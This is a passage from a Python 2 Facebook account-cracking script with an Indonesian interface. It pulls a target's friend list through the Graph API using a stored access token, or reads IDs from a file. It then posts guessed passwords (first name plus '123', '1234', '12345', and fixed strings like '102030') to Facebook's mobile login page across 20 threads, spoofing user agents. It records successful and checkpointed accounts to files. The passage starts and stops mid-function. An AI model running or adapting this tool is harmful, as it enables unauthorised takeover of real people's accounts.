                            print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw4)
                            cek.close()
                            cekpoint.append(em)
                        else:
                            pw5 = 'Anjing'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw5
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw5)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
                            print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw5
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw5)
                            cek.close()
                            cekpoint.append(em)
        except:
            pass
    p = ThreadPool(20)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mSelesai ....'
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;93mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;93m' + str(len(cekpoint))
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mCP file tersimpan : out/indo.txt'
    print 47 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
    os.system('python2 KIYAY_.py')
def bangla():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[0;97m [\x1b[0;97m01\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack dari ID Publik / Teman'
    print '\x1b[0;97m [\x1b[0;97m02\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack dari File'
    print '\x1b[0;97m [\x1b[0;91m00\x1b[0;97m]\x1b[0;97m\x1b[0;97m Kembali'
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    pilih_bangla()
def pilih_bangla():
    teak = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m ')
    if teak == '':
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
        pilih_bangla()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
            idt = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] User ID Target : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Nama Akun      : ' + op['name']
            except KeyError:
                print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] ID Publik / Teman Tidak Ada !'
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
                bangla()
            except requests.exceptions.ConnectionError:
                print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Tidak ada koneksi !'
                keluar()
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            try:
                print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                idlist = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Nama File Target : ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print "\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] File tidak ada ! '"
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
            except IOError:
                print "\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] File tidak ada !'"
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
                bangla()
        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
            pilih_bangla()
        print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Total ID       : ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)
    print '\n\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m \x1b[1;41;97mUNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM !\x1b[0m'
    print '\x1b[1;97m \x1b[1;41;97mTIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK !\x1b[0m'
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[0;97m%H:%M:%S')))
        sys.stdout.flush()
        em = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
            v = json.loads(an.text)
            pw = v['first_name'] + '123'
            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw
                oke = open('done/bangla.txt', 'a')
                oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw)
                oke.close()
                oks.append(em)
            elif 'checkpoint' in xo:
                print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw
                cek = open('done/bangla.txt', 'a')
                cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw)
                cek.close()
                cekpoint.append(em)
            else:
                pw2 = v['first_name'] + '12345'
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36'})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw2
                    oke = open('done/bangla.txt', 'a')
                    oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw2)
                    oke.close()
                    oks.append(em)
                elif 'checkpoint' in xo:
                    print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw2
                    cek = open('done/bangla.txt', 'a')
                    cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw2)
                    cek.close()
                    cekpoint.append(em)
                else:
                    pw3 = v['first_name'] + '1234'
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36'})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw3
                        oke = open('done/bangla.txt', 'a')
                        oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw3)
                        oke.close()
                        oks.append(em)
                    elif 'checkpoint' in xo:
                        print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw3
                        cek = open('done/bangla.txt', 'a')
                        cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw3)
                        cek.close()
                        cekpoint.append(em)
                    else:
                        pw4 = '102030'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw4
                            oke = open('done/bangla.txt', 'a')
                            oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw4)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
                            print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw4
                            cek = open('done/bangla.txt', 'a')
                            cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw4)
                            cek.close()
                            cekpoint.append(em)
                        else:
                            pw5 = '102030'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw5
                            oke = open('done/bangla.txt', 'a')
                            oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw5)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
                            print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw5
                            cek = open('done/bangla.txt', 'a')
                            cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw5)
                            cek.close()
                            cekpoint.append(em)
        except:
            pass
    p = ThreadPool(20)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mSelesai ....'
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;93mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;93m' + str(len(cekpoint))
    print '\x1b[0;97m[\x1b[0;91m\xe2\x80\xa2\x1b[0;93m\xe2\x80\xa2\x1b[0;92m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mCP file tersimpan : out/bangla.txt'
    print 47 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[0;97m[\x1b[0;91m Back \x1b[0;97m]')
    os.system('python2 KIYAY_.py')
def hindi():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[0;97m [\x1b[0;97m01\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack dari ID Publik / Teman'
    print '\x1b[0;97m [\x1b[0;97m02\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack dari File'
    print '\x1b[0;97m [\x1b[0;91m00\x1b[0;97m]\x1b[0;97m\x1b[0;97m Kembali'
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    pilih_hindi()
def pilih_hindi():
    teak = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m ')
    if teak == '':
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
        pilih_hindi()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
            idt = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] User ID Target : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Nama Akun      : ' + op['name']
            except KeyError:
                print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] ID Publik / Teman Tidak Ada !'
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
                hindi()
            except requests.exceptions.ConnectionError:
                print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Tidak ada koneksi !'
                keluar()
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            try:
                print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                idlist = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Nama File Target : ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print "\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] File tidak ada ! '"
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
            except IOError:
                print "\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] File tidak ada !'"
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
                hindi()
        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
            pilih_hindi()
        print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Total ID       : ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)
    print '\n\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m \x1b[1;41;97mUNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM !\x1b[0m'
    print '\x1b[1;97m \x1b[1;41;97mTIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK !\x1b[0m'
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[0;97m%H:%M:%S')))
        sys.stdout.flush()
        em = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
            v = json.loads(an.text)
            pw = v['first_name'] + '123'
            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
